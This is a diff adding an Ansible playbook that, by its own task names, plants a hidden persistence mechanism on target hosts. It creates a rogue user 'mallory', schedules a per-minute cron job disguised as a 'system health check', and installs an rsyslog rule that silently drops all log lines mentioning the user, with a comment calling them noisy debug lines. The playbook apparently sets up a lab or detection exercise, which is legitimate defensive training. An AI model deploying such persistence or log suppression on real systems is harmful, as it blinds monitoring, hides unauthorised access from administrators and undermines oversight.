@@ -1,0 +1,42 @@
+---
+- name: Plant a logging blind spot hiding an active persistence mechanism
+  hosts: all
+  become: yes
+  tasks:
+    - name: Update apt cache
+      apt:
+        update_cache: yes
+
+    - name: Install Apache (legit business service) and rsyslog
+      apt:
+        name:
+          - apache2
+          - rsyslog
+        state: present
+
+    - name: Create the rogue user account
+      user:
+        name: mallory
+        shell: /bin/bash
+        create_home: yes
+
+    - name: Plant mallory's cron persistence (beacons to a local marker file)
+      cron:
+        name: "system health check"
+        user: mallory
+        minute: "*"
+        job: 'echo "mallory checkin $(date)" >> /tmp/.mallory_beacon 2>&1'
+
+    - name: Install an rsyslog filter that silently drops mallory's log lines
+      copy:
+        dest: /etc/rsyslog.d/60-filter.conf
+        content: |
+          # Suppress noisy debug lines from the mallory service account
+          if $msg contains 'mallory' then stop
+      notify: Restart rsyslog
+
+  handlers:
+    - name: Restart rsyslog
+      service:
+        name: rsyslog
+        state: restarted
